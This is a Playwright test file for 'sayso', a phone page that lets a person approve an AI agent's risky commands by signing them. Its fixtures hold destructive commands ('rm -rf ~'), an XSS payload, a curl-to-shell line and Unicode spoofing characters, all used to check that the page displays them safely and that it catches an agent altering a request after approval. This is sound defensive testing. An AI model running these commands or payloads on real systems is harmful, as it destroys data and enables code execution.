// Run: npx -y -p playwright@1.64.1 node test/page/verify-page.mjs [chromium,webkit,firefox]
// Or print fixtures for driving a browser by hand: node test/page/verify-page.mjs fixtures <base-url>
// Or check a code a browser produced: node test/page/verify-page.mjs check <doc> <code> <public_key> <id>
import assert from "node:assert/strict";
import { execSync } from "node:child_process";
import fs from "node:fs";
import { createRequire } from "node:module";
import path from "node:path";
import { encodeDoc, generatePairing, verifyApproval } from "../../src/sign.mjs";
import { forDisplay } from "../../src/redact.mjs";
import { DOCS, serve } from "./serve.mjs";

const CSP = "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; base-uri 'none'; form-action 'none'";
const XSS = `<img src=x onerror="window.__xss=1"><script>window.__xss=2</script>`;
const PHONE = { viewport: { width: 390, height: 844 } };

const fixtureDoc = (overrides = {}) =>
  encodeDoc({
    v: 1,
    id: "r_fixture",
    nonce: "n0nce",
    session: "harbor-api",
    cwd: "/Users/sam/projects/harbor-api",
    tool: "Bash",
    kind: "tool",
    risk: "destructive",
    why: ["recursive delete of a glob"],
    display: "rm -rf ./build/*",
    warnings: [],
    expires_at: new Date(Date.now() + 15 * 60_000).toISOString(),
    input_sha256: "0".repeat(64),
    ...overrides,
  });

const pairUrl = (base, pairing, name = "My phone") => `${base}#pair=${pairing.pkcs8}&id=${pairing.id}&name=${encodeURIComponent(name)}`;
const requestUrl = (base, doc) => `${base}#r=${doc}`;
const keysOf = (...pairings) => pairings.map((p) => ({ id: p.id, public_key: p.public_key, name: "test" }));

async function hold(page, ms) {
  await page.locator(".hold:not([disabled])").waitFor();
  await page.locator(".hold").scrollIntoViewIfNeeded();
  const box = await page.locator(".hold").boundingBox();
  await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
  await page.mouse.down();
  await page.waitForTimeout(ms);
  await page.mouse.up();
}

const readStoredKeys = (page) =>
  page.evaluate(
    () =>
      new Promise((resolve, reject) => {
        const open = indexedDB.open("sayso", 1);
        open.onerror = () => reject(open.error);
        open.onsuccess = () => {
          const all = open.result.transaction("keys").objectStore("keys").getAll();
          all.onsuccess = () => {
            open.result.close();
            resolve(all.result.map((r) => ({ id: r.id, name: r.name, paired_at: r.paired_at, extractable: r.key.extractable, usages: r.key.usages, algorithm: r.key.algorithm.name, type: r.key.type })));
          };
        };
      }),
  );

const noCodeAppeared = async (page) => assert.equal(await page.locator(".code").count(), 0, "no approval code may exist yet");
const assertNoOverflow = async (page, label) => {
  const { scroll, inner } = await page.evaluate(() => ({ scroll: document.documentElement.scrollWidth, inner: innerWidth }));
  assert.ok(scroll <= inner, `${label}: page scrolls sideways, ${scroll} > ${inner}`);
};

const TESTS = {
  async "pair stores a non-extractable key and removes the secret from the URL"(ctx, base) {
    const pairing = generatePairing();
    const page = await ctx.newPage();
    await page.goto(pairUrl(base, pairing));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();
    assert.equal(await page.evaluate(() => location.hash), "");
    assert.ok(!page.url().includes("pair="), `secret still in URL: ${page.url()}`);
    const [key, ...rest] = await readStoredKeys(page);
    assert.deepEqual(rest, []);
    assert.equal(key.extractable, false);
    assert.deepEqual(key.usages, ["sign"]);
    assert.equal(key.algorithm, "Ed25519");
    assert.equal(key.id, pairing.id);
    assert.equal(key.name, "My phone");
    const body = await page.locator("#app").innerText();
    assert.ok(body.includes(pairing.id), "shows the key id");
    assert.ok(body.includes("close this page"), "says the page can be closed");
    assert.ok(body.includes("home screen") && body.includes("sayso pair"), "explains the iPhone week limit and the way back");
    await assertNoOverflow(page, "paired");

    await page.goto("about:blank");
    await page.goto(pairUrl(base, pairing));
    await page.getByRole("heading", { name: "Already paired" }).waitFor();
    const again = await readStoredKeys(page);
    assert.equal(again.length, 1);
    assert.equal(again[0].paired_at, key.paired_at, "the first key is kept");
  },

  async "a damaged pairing link stores nothing and still clears the fragment"(ctx, base) {
    const page = await ctx.newPage();
    await page.goto(`${base}#pair=not-a-key&id=abcd1234&name=x`);
    await page.getByRole("heading", { name: "This pairing link is damaged" }).waitFor();
    assert.equal(await page.evaluate(() => location.hash), "");
    await page.goto("about:blank");
    await page.goto(`${base}#pair=abc&id=NOTHEX&name=x`);
    await page.getByRole("heading", { name: "This pairing link is damaged" }).waitFor();
  },

  async "a stray tap and a short hold say nothing, a full hold signs a code Node accepts"(ctx, base) {
    const pairing = generatePairing();
    const page = await ctx.newPage();
    await page.goto(pairUrl(base, pairing));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();

    const doc = fixtureDoc();
    await page.goto("about:blank");
    await page.goto(requestUrl(base, doc));
    await page.locator(".hold:not([disabled])").waitFor();
    await page.locator(".hold").click();
    await page.waitForTimeout(1000);
    await noCodeAppeared(page);
    await hold(page, 400);
    await page.waitForTimeout(1000);
    await noCodeAppeared(page);

    await hold(page, 950);
    const code = (await page.locator(".code").textContent()).trim();
    assert.equal(verifyApproval(doc, code, keysOf(pairing)).ok, true, `Node rejected ${code}`);
    assert.equal(code.split(".")[1], pairing.id);
    const altered = fixtureDoc({ display: "rm -rf ~/build/*" });
    assert.equal(verifyApproval(altered, code, keysOf(pairing)).ok, false, "the signature must not fit an altered request");
    assert.ok((await page.locator("#app").innerText()).includes("Send this code back to your agent. It only works for this one request."));
    await assertNoOverflow(page, "signed");
  },

  async "a real finger: a tap does nothing, a touch held to the end signs"(_ctx, base, engine, browser) {
    if (engine !== "chromium") return;
    const ctx = await browser.newContext({ ...PHONE, hasTouch: true, isMobile: true });
    try {
      const pairing = generatePairing();
      const page = await ctx.newPage();
      await page.goto(pairUrl(base, pairing));
      await page.getByRole("heading", { name: "This device is paired" }).waitFor();
      const doc = fixtureDoc();
      await page.goto("about:blank");
      await page.goto(requestUrl(base, doc));
      await page.locator(".hold:not([disabled])").waitFor();
      await page.locator(".hold").tap();
      await page.waitForTimeout(1000);
      await noCodeAppeared(page);
      const box = await page.locator(".hold").boundingBox();
      const point = { x: box.x + box.width / 2, y: box.y + box.height / 2 };
      const cdp = await ctx.newCDPSession(page);
      await cdp.send("Input.dispatchTouchEvent", { type: "touchStart", touchPoints: [point] });
      await page.waitForTimeout(950);
      await cdp.send("Input.dispatchTouchEvent", { type: "touchEnd", touchPoints: [] });
      const code = (await page.locator(".code").textContent()).trim();
      assert.equal(verifyApproval(doc, code, keysOf(pairing)).ok, true);
    } finally {
      await ctx.close();
    }
  },

  async "dragging off the button cancels the hold"(ctx, base) {
    const pairing = generatePairing();
    const page = await ctx.newPage();
    await page.goto(pairUrl(base, pairing));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();
    await page.goto("about:blank");
    await page.goto(requestUrl(base, fixtureDoc()));
    await page.locator(".hold:not([disabled])").waitFor();
    const box = await page.locator(".hold").boundingBox();
    await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
    await page.mouse.down();
    await page.waitForTimeout(200);
    await page.mouse.move(box.x + box.width / 2, box.y - 200);
    await page.waitForTimeout(1000);
    await page.mouse.up();
    await noCodeAppeared(page);
  },

  async "the keyboard can hold too, and key repeat does not count as a new press"(ctx, base) {
    const pairing = generatePairing();
    const page = await ctx.newPage();
    await page.goto(pairUrl(base, pairing));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();
    const doc = fixtureDoc();
    await page.goto("about:blank");
    await page.goto(requestUrl(base, doc));
    await page.locator(".hold").focus();
    await page.keyboard.press("Space");
    await page.waitForTimeout(500);
    await noCodeAppeared(page);
    await page.keyboard.down("Space");
    await page.waitForTimeout(950);
    await page.keyboard.up("Space");
    const code = (await page.locator(".code").textContent()).trim();
    assert.equal(verifyApproval(doc, code, keysOf(pairing)).ok, true);
  },

  async "with several keys stored, the newest signs"(ctx, base) {
    const older = generatePairing();
    const newer = generatePairing();
    const page = await ctx.newPage();
    await page.goto(pairUrl(base, older));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();
    await page.waitForTimeout(5);
    await page.goto("about:blank");
    await page.goto(pairUrl(base, newer));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();
    const doc = fixtureDoc();
    await page.goto("about:blank");
    await page.goto(requestUrl(base, doc));
    await page.locator(".hold:not([disabled])").waitFor();
    await hold(page, 950);
    const code = (await page.locator(".code").textContent()).trim();
    assert.equal(code.split(".")[1], newer.id);
    assert.equal(verifyApproval(doc, code, keysOf(older, newer)).key_id, newer.id);
  },

  async "an attacker's markup renders as text everywhere and never runs"(ctx, base) {
    const display = `echo ${XSS} && rm -rf ~`;
    const doc = fixtureDoc({ display, session: XSS, cwd: `/tmp/${XSS}`, tool: XSS, why: [XSS], warnings: [XSS] });
    const page = await ctx.newPage();
    const violations = [];
    page.on("console", (m) => violations.push(m.text()));
    await page.goto(requestUrl(base, doc));
    await page.locator(".command").first().waitFor();
    assert.equal(await page.locator(".command").first().textContent(), display);
    const inPage = await page.evaluate(() => ({
      xss: window.__xss,
      images: document.querySelectorAll('img[src="x"]').length,
      scripts: document.querySelectorAll("#app script").length,
      imagesInCommand: document.querySelectorAll(".command img").length,
    }));
    assert.deepEqual(inPage, { xss: undefined, images: 0, scripts: 0, imagesInCommand: 0 });
    const all = await page.locator("#app").innerText();
    assert.ok(all.includes('onerror="window.__xss=1"'), "the markup is visible as characters");
    await assertNoOverflow(page, "xss");
  },

  async "hidden characters are marked and warned about, in the command and in the folder"(ctx, base) {
    const shown = forDisplay("rm -rf /tmp/a‮/gnp.txt​");
    const doc = fixtureDoc({ display: shown.text, warnings: shown.warnings, cwd: "/tmp/in‮voice" });
    const page = await ctx.newPage();
    await page.goto(requestUrl(base, doc));
    const warning = page.locator(".warning");
    await warning.waitFor();
    const text = await warning.innerText();
    assert.ok(text.includes("This command contains hidden characters"), text);
    assert.ok(text.includes("reverse how text reads"), text);
    assert.ok(text.includes("The session or folder name contains hidden characters"), text);
    assert.ok((await page.locator(".command").first().textContent()).includes("⟦U+202E⟧"));
    assert.ok((await page.locator('[data-field="cwd"]').textContent()).includes("⟦U+202E⟧"), "raw direction override must not reach the folder row");
    assert.ok(!(await page.locator("#app").textContent()).includes("‮"));
    assert.ok((await page.locator(".hidden-mark").count()) >= 2);
  },

  async "every risk reads in words"(ctx, base) {
    const wanted = {
      destructive: "Deletes files",
      catastrophic: "Could wipe this machine",
      outward: "Publishes something",
      opaque: "Runs code sayso cannot read",
      self: "Touches sayso itself",
      credentials: "Reads credentials",
      prompt: "Asks permission",
      constructor: "Needs your say-so",
    };
    const page = await ctx.newPage();
    for (const [risk, words] of Object.entries(wanted)) {
      await page.goto("about:blank");
      await page.goto(requestUrl(base, fixtureDoc({ risk })));
      assert.equal(await page.locator('[data-field="risk"]').textContent(), words);
    }
  },

  async "the countdown runs, and an expired request cannot be approved"(ctx, base) {
    const pairing = generatePairing();
    const page = await ctx.newPage();
    await page.goto(pairUrl(base, pairing));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();

    await page.goto("about:blank");
    await page.goto(requestUrl(base, fixtureDoc({ expires_at: new Date(Date.now() - 1000).toISOString() })));
    await page.getByText("Expired", { exact: true }).first().waitFor();
    assert.equal(await page.locator(".hold").isDisabled(), true);
    const box = await page.locator(".hold").boundingBox();
    await page.mouse.move(box.x + 20, box.y + 20);
    await page.mouse.down();
    await page.waitForTimeout(1000);
    await page.mouse.up();
    await noCodeAppeared(page);

    await page.goto("about:blank");
    await page.goto(requestUrl(base, fixtureDoc({ expires_at: new Date(Date.now() + 2500).toISOString() })));
    const countdown = page.locator(".countdown");
    await page.waitForFunction(() => /^Expires in 0:0[12]$/.test(document.querySelector(".countdown")?.textContent ?? ""));
    const first = await countdown.textContent();
    await page.waitForFunction((was) => document.querySelector(".countdown").textContent !== was, first);
    await page.getByText("This request expired, so it was not run.").waitFor({ timeout: 4000 });
    assert.equal(await countdown.textContent(), "Expired");
    assert.equal(await page.locator(".hold").isDisabled(), true);

    await page.goto("about:blank");
    await page.goto(requestUrl(base, fixtureDoc({ expires_at: new Date(Date.now() + 1400).toISOString() })));
    await page.locator(".hold:not([disabled])").waitFor();
    await page.waitForTimeout(800);
    const live = await page.locator(".hold").boundingBox();
    await page.mouse.move(live.x + 20, live.y + 20);
    await page.mouse.down();
    await page.waitForTimeout(1500);
    await page.mouse.up();
    await noCodeAppeared(page);
  },

  async "the hold stays off until a long command has been on the screen to its end"(ctx, base) {
    const pairing = generatePairing();
    const page = await ctx.newPage();
    await page.goto(pairUrl(base, pairing));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();
    await page.goto("about:blank");
    await page.goto(requestUrl(base, fixtureDoc({ display: `rm -rf ./cache \\\n${"\\\n".repeat(77)}~/Documents` })));
    await page.locator(".hold").waitFor();
    assert.equal(await page.locator(".hold").isDisabled(), true);
    const box = await page.locator(".hold").boundingBox();
    await page.mouse.move(box.x + 20, box.y + 20);
    await page.mouse.down();
    await page.waitForTimeout(1200);
    await page.mouse.up();
    await noCodeAppeared(page);
    await page.evaluate(() => scrollTo(0, document.documentElement.scrollHeight));
    await hold(page, 950);
    await page.locator(".code").waitFor();
  },

  async "a request the page can't show in full has no hold at all"(ctx, base) {
    const pairing = generatePairing();
    const page = await ctx.newPage();
    await page.goto(pairUrl(base, pairing));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();
    await page.goto("about:blank");
    await page.goto(requestUrl(base, fixtureDoc({ unread: true })));
    await page.getByText("This can't be approved here").waitFor();
    assert.equal(await page.locator(".hold").count(), 0);
  },

  async "an unpaired device shows the request and no way to approve"(ctx, base) {
    const page = await ctx.newPage();
    await page.goto(requestUrl(base, fixtureDoc()));
    await page.getByText("This device is not paired").waitFor();
    assert.equal(await page.locator(".hold").count(), 0);
    assert.equal(await page.locator(".command").first().textContent(), "rm -rf ./build/*");
    assert.ok((await page.locator("#app").innerText()).includes("sayso pair"));
  },

  async "a browser without Ed25519 is told the minimum versions"(ctx, base) {
    await ctx.addInitScript(() => {
      const real = SubtleCrypto.prototype.generateKey;
      SubtleCrypto.prototype.generateKey = function (algorithm, ...rest) {
        if ((algorithm.name ?? algorithm) === "Ed25519") return Promise.reject(new DOMException("no", "NotSupportedError"));
        return real.call(this, algorithm, ...rest);
      };
    });
    const page = await ctx.newPage();
    await page.goto(requestUrl(base, fixtureDoc()));
    await page.getByText("This browser cannot sign").waitFor();
    const text = await page.locator("#app").innerText();
    for (const name of ["Safari 17", "Chrome 137", "Firefox 130"]) assert.ok(text.includes(name), `names ${name}`);
    assert.equal(await page.locator(".hold").count(), 0);
    await page.goto("about:blank");
    await page.goto(base);
    await page.getByText("This browser cannot sign").waitFor();
    assert.equal(await page.locator(".hold").count(), 0);
  },

  async "damaged request links are refused, including text smuggled after the document"(ctx, base) {
    const page = await ctx.newPage();
    for (const fragment of ["#r=%%%", "#r=abc", `#r=${fixtureDoc()}&display=rm`, `#r=${encodeDoc({ v: 2, display: "x", expires_at: new Date().toISOString() })}`, `#r=${encodeDoc({ v: 1, display: 5, expires_at: "soon" })}`]) {
      await page.goto("about:blank");
      await page.goto(base + fragment);
      await page.getByRole("heading", { name: "This link is damaged" }).waitFor();
      assert.equal(await page.locator(".hold").count(), 0, fragment);
    }
  },

  async "a 2000 character command shows every character with no sideways scroll"(ctx, base) {
    const long = "rm -rf " + "a".repeat(1400) + " " + "/very/long/path-with-no-break".repeat(20);
    const page = await ctx.newPage();
    await page.goto(requestUrl(base, fixtureDoc({ display: long, cwd: "/" + "deep/".repeat(40) })));
    await page.locator(".command").first().waitFor();
    assert.equal(await page.locator(".command").first().textContent(), long);
    await assertNoOverflow(page, "long command");
    const clipped = await page.locator(".command").first().evaluate((el) => el.scrollHeight > el.clientHeight + 1 || el.scrollWidth > el.clientWidth + 1);
    assert.equal(clipped, false, "the command block must grow rather than clip");
  },

  async "copy puts the code on the clipboard, or selects it when the clipboard is gone; share offers the code"(ctx, base, engine) {
    const pairing = generatePairing();
    await ctx.addInitScript(() => {
      window.__shared = [];
      Object.defineProperty(navigator, "share", { configurable: true, value: async (data) => window.__shared.push(data) });
    });
    if (engine === "chromium") await ctx.grantPermissions(["clipboard-read", "clipboard-write"]);
    const page = await ctx.newPage();
    await page.goto(pairUrl(base, pairing));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();
    await page.goto("about:blank");
    await page.goto(requestUrl(base, fixtureDoc()));
    await page.locator(".hold:not([disabled])").waitFor();
    await hold(page, 950);
    const code = (await page.locator(".code").textContent()).trim();
    await page.getByRole("button", { name: "Share" }).click();
    assert.deepEqual(await page.evaluate(() => window.__shared), [{ text: code }]);
    if (engine === "chromium") {
      await page.getByRole("button", { name: "Copy code" }).click();
      await page.getByText("Copied", { exact: true }).waitFor();
      assert.equal(await page.evaluate(() => navigator.clipboard.readText()), code);
    }
    await page.evaluate(() => Object.defineProperty(navigator, "clipboard", { configurable: true, value: undefined }));
    await page.locator('[data-action="copy"]').click();
    await page.getByText("Selected. Copy it from the menu.").waitFor();
    assert.equal(await page.evaluate(() => getSelection().toString().trim()), code);
  },

  async "saying no is a quiet path that signs nothing and can be undone"(ctx, base) {
    const pairing = generatePairing();
    const page = await ctx.newPage();
    await page.goto(pairUrl(base, pairing));
    await page.getByRole("heading", { name: "This device is paired" }).waitFor();
    await page.goto("about:blank");
    await page.goto(requestUrl(base, fixtureDoc()));
    await page.getByRole("button", { name: "Say no" }).click();
    await page.getByText("Tell your agent no.").waitFor();
    await page.getByText("Nothing needs signing.").waitFor();
    await noCodeAppeared(page);
    assert.equal(await page.locator(".hold").count(), 0);
    await page.getByRole("button", { name: "I changed my mind" }).click();
    await page.locator(".hold:not([disabled])").waitFor();
  },

  async "the demo signs with an in-memory key, never opens IndexedDB, and the lie fails a real verify"(ctx, base) {
    await ctx.addInitScript(() => {
      window.__verdicts = [];
      window.__idbOpens = 0;
      const realVerify = SubtleCrypto.prototype.verify;
      SubtleCrypto.prototype.verify = async function (...args) {
        const result = await realVerify.apply(this, args);
        window.__verdicts.push(result);
        return result;
      };
      const realOpen = IDBFactory.prototype.open;
      IDBFactory.prototype.open = function (...args) {
        window.__idbOpens++;
        return realOpen.apply(this, args);
      };
    });
    const page = await ctx.newPage();
    await page.goto(base);
    await page.locator(".hold:not([disabled])").waitFor();
    const reading = await page.locator("#app").innerText();
    assert.ok(reading.includes("rm -rf ./*"), "sample request is on screen");
    await hold(page, 950);
    await page.locator(".verdict").waitFor();
    const proof = page.locator('[data-field="proof-command"]');
    await page.waitForFunction(() => document.querySelector(".verdict")?.dataset.verdict === "pass");
    assert.equal(await proof.textContent(), "rm -rf ./*");
    assert.match(await page.locator(".verdict").innerText(), /Signature passes/);

    await page.getByRole("button", { name: "Agent tries to lie" }).click();
    await page.waitForFunction(() => document.querySelector(".verdict")?.dataset.verdict === "fail");
    assert.equal(await proof.textContent(), "rm -rf ~/*");
    assert.match(await page.locator(".verdict").innerText(), /Signature fails/);

    await page.getByRole("button", { name: "Show the real request" }).click();
    await page.waitForFunction(() => document.querySelector(".verdict")?.dataset.verdict === "pass");
    assert.equal(await proof.textContent(), "rm -rf ./*");

    assert.deepEqual(await page.evaluate(() => window.__verdicts), [true, false, true]);
    assert.equal(await page.evaluate(() => window.__idbOpens), 0, "the demo must not touch IndexedDB");
    const databases = await page.evaluate(() => indexedDB.databases?.().then((list) => list.map((d) => d.name)));
    assert.ok(!databases?.includes("sayso"), `found databases ${databases}`);
    await assertNoOverflow(page, "demo proof");

    await page.getByRole("button", { name: "Start over" }).click();
    await page.locator(".hold:not([disabled])").waitFor();
  },

  async "the policy is exact and the page cannot reach any network"(ctx, base) {
    const page = await ctx.newPage();
    const requests = [];
    page.on("request", (r) => requests.push(r.url()));
    await page.goto(base);
    await page.locator(".hold:not([disabled])").waitFor();
    assert.equal(await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content"), CSP);
    const blocked = await page.evaluate(async (origin) => {
      const results = {};
      for (const [name, url] of [["same origin", `${origin}app.js`], ["elsewhere", "https://example.com/"]]) {
        results[name] = await fetch(url).then(() => "reached", () => "blocked");
      }
      results.beacon = (() => {
        try {
          return navigator.sendBeacon("https://example.com/", "x") ? "queued" : "blocked";
        } catch {
          return "blocked";
        }
      })();
      return results;
    }, base);
    assert.equal(blocked["same origin"], "blocked");
    assert.equal(blocked.elsewhere, "blocked");
    await page.waitForTimeout(300);
    const foreign = requests.filter((url) => !url.startsWith(base) && !url.startsWith("data:"));
    assert.deepEqual(foreign, [], "no third party request of any kind");
    assert.ok((await page.locator(".foot").innerText()).includes("cannot send your key or your requests anywhere"));
  },

  async "inside another page's frame it refuses to pair or sign"(ctx, base) {
    const page = await ctx.newPage();
    await page.setContent(`<iframe src="${requestUrl(base, fixtureDoc())}" width="390" height="600"></iframe>`);
    const frame = page.frameLocator("iframe");
    await frame.getByRole("heading", { name: "Open this page in its own tab" }).waitFor();
    assert.equal(await frame.locator(".hold").count(), 0);
  },

  async "reduced motion keeps the fill, drops the press movement, still needs the full hold"(ctx, base) {
    const page = await ctx.newPage();
    await page.emulateMedia({ reducedMotion: "reduce" });
    await page.goto(base);
    await page.locator(".hold:not([disabled])").waitFor();
    await page.locator(".hold").scrollIntoViewIfNeeded();
    const box = await page.locator(".hold").boundingBox();
    await page.mouse.move(box.x + 20, box.y + 20);
    await page.mouse.down();
    await page.waitForTimeout(200);
    const transform = await page.locator(".hold").evaluate((el) => getComputedStyle(el).transform);
    assert.ok(transform === "none", `press must not move, got ${transform}`);
    await page.mouse.up();
    await noCodeAppeared(page);
    await hold(page, 950);
    await page.locator(".code").waitFor();
  },

  async "colours hold their contrast in both themes and differ in lightness"(ctx, base) {
    const page = await ctx.newPage();
    const luminance = (hex) => {
      const channel = (i) => {
        const v = parseInt(hex.slice(1 + i * 2, 3 + i * 2), 16) / 255;
        return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4;
      };
      return 0.2126 * channel(0) + 0.7152 * channel(1) + 0.0722 * channel(2);
    };
    const ratio = (a, b) => {
      const [hi, lo] = [luminance(a), luminance(b)].sort((x, y) => y - x);
      return (hi + 0.05) / (lo + 0.05);
    };
    const PAIRS = [
      ["--ink", "--bg", 4.5],
      ["--ink", "--card", 4.5],
      ["--ink-2", "--bg", 4.5],
      ["--ink-2", "--card", 4.5],
      ["--tint", "--bg", 4.5],
      ["--tint", "--tint-soft", 4.5],
      ["--on-fill", "--tint-fill", 4.5],
      ["--warn-ink", "--warn-bg", 4.5],
      ["--on-stop", "--stop", 4.5],
      ["--stop", "--card", 3],
      ["--ok", "--card", 3],
      ["--caution", "--bg", 3],
      ["--tint-fill", "--tint-soft", 3],
      ["--stop", "--ok", 1.5],
    ];
    for (const colorScheme of ["light", "dark"]) {
      await page.emulateMedia({ colorScheme });
      await page.goto(base);
      await page.locator(".hold:not([disabled])").waitFor();
      const tokens = await page.evaluate((names) => {
        const style = getComputedStyle(document.documentElement);
        return Object.fromEntries(names.map((name) => [name, style.getPropertyValue(name).trim()]));
      }, [...new Set(PAIRS.flatMap(([a, b]) => [a, b]))]);
      for (const [a, b, floor] of PAIRS) {
        const got = ratio(tokens[a], tokens[b]);
        assert.ok(got >= floor, `${colorScheme} ${a} ${tokens[a]} on ${b} ${tokens[b]} is ${got.toFixed(2)}, floor ${floor}`);
      }
      assert.equal(await page.evaluate(() => getComputedStyle(document.body).backgroundColor !== "rgba(0, 0, 0, 0)"), true, "body background is explicit");
    }
  },

  async "layout stays inside 390 and a composed column at 1440, and every control is at least 44px"(ctx, base) {
    const page = await ctx.newPage();
    await page.goto(base);
    await page.locator(".hold:not([disabled])").waitFor();
    const small = await page.evaluate(() =>
      [...document.querySelectorAll("button, a")]
        .filter((el) => el.offsetParent !== null)
        .map((el) => ({ text: el.textContent.trim().slice(0, 30), height: el.getBoundingClientRect().height }))
        .filter((item) => item.height < 44),
    );
    assert.deepEqual(small, [], "targets under 44px");
    await hold(page, 950);
    await page.locator(".verdict").waitFor();
    const smallAfter = await page.evaluate(() =>
      [...document.querySelectorAll("button, a")]
        .filter((el) => el.offsetParent !== null)
        .map((el) => ({ text: el.textContent.trim().slice(0, 30), height: el.getBoundingClientRect().height }))
        .filter((item) => item.height < 44),
    );
    assert.deepEqual(smallAfter, [], "targets under 44px after signing");
    const box = await page.locator("#app").boundingBox();
    assert.equal(box.x, 16, "16px gutter on the left");
    assert.equal(box.width, 358, "16px gutter on the right");
    await assertNoOverflow(page, "390");

    await page.setViewportSize({ width: 1440, height: 900 });
    const wide = await page.locator("#app").boundingBox();
    assert.ok(wide.width <= 480, `column stays narrow, got ${wide.width}`);
    assert.ok(Math.abs(wide.x + wide.width / 2 - 720) <= 1, `column is centred, got x ${wide.x}`);
    await assertNoOverflow(page, "1440");
  },
};

function staticChecks() {
  const sources = Object.fromEntries(["index.html", "app.js", "style.css", "mark.svg", "mark-dark.svg"].map((name) => [name, fs.readFileSync(path.join(DOCS, name), "utf8")]));
  const failures = [];
  for (const [name, text] of Object.entries(sources)) {
    if (/[—–]/.test(text)) failures.push(`${name} has a long dash`);
    if (/https?:\/\/(?!github\.com\/abhaymettu\/sayso|www\.w3\.org\/2000\/svg)/.test(text)) failures.push(`${name} names a third party URL`);
    if (/gradient/i.test(name.endsWith(".svg") ? text : "")) failures.push(`${name} has a gradient`);
  }
  if (/innerHTML|outerHTML|insertAdjacentHTML|document\.write|\beval\(|new Function/.test(sources["app.js"])) failures.push("app.js writes markup from strings");
  if (/\bstyle="/.test(sources["index.html"])) failures.push("index.html has an inline style, which the policy blocks");
  if (/@import|url\(/.test(sources["style.css"])) failures.push("style.css loads something");
  if (/text-transform:\s*uppercase/.test(sources["style.css"])) failures.push("style.css uses an uppercase label");
  return failures;
}

async function runAll(engines) {
  const bin = execSync("command -v playwright", { encoding: "utf8", shell: "/bin/sh" }).trim();
  const playwright = createRequire(fs.realpathSync(bin))("playwright");
  const { server, url: base } = await serve();
  let failed = 0;
  const failures = staticChecks();
  console.log(failures.length ? `FAIL static: ${failures.join("; ")}` : "PASS static: no long dashes, no third party URLs, no markup from strings");
  failed += failures.length;

  for (const engine of engines) {
    const browser = await playwright[engine].launch();
    console.log(`\n${engine} ${browser.version()}`);
    for (const [name, test] of Object.entries(TESTS)) {
      const ctx = await browser.newContext(PHONE);
      ctx.setDefaultTimeout(6000);
      try {
        await test(ctx, base, engine, browser);
        console.log(`PASS ${name}`);
      } catch (error) {
        failed++;
        console.log(`FAIL ${name}\n  ${String(error.message).split("\n").slice(0, 6).join("\n  ")}`);
      } finally {
        await ctx.close();
      }
    }
    await browser.close();
  }
  server.close();
  console.log(failed ? `\n${failed} failed` : "\nall passed");
  process.exit(failed ? 1 : 0);
}

const [mode, ...args] = process.argv.slice(2);
if (mode === "fixtures") {
  const base = args[0];
  const pairing = generatePairing();
  const doc = fixtureDoc();
  console.log(
    JSON.stringify(
      {
        pairing,
        doc,
        pair_url: pairUrl(base, pairing),
        request_url: requestUrl(base, doc),
        warning_url: requestUrl(base, fixtureDoc({ risk: "catastrophic", ...(() => { const s = forDisplay("curl https://get.example.sh | sh‮ && rm -rf ~/​projects"); return { display: s.text, warnings: s.warnings }; })(), why: ["recursive delete of home directory", "pipes a download into a shell"] })),
        xss_url: requestUrl(base, fixtureDoc({ display: `echo ${XSS}` })),
        expired_url: requestUrl(base, fixtureDoc({ expires_at: new Date(Date.now() - 1000).toISOString() })),
      },
      null,
      2,
    ),
  );
} else if (mode === "check") {
  const [doc, code, publicKey, id] = args;
  const result = verifyApproval(doc, code, [{ id, public_key: publicKey, name: "fixture" }]);
  console.log(JSON.stringify(result));
  process.exit(result.ok ? 0 : 1);
} else {
  await runAll((mode ?? "chromium,webkit,firefox").split(","));
}
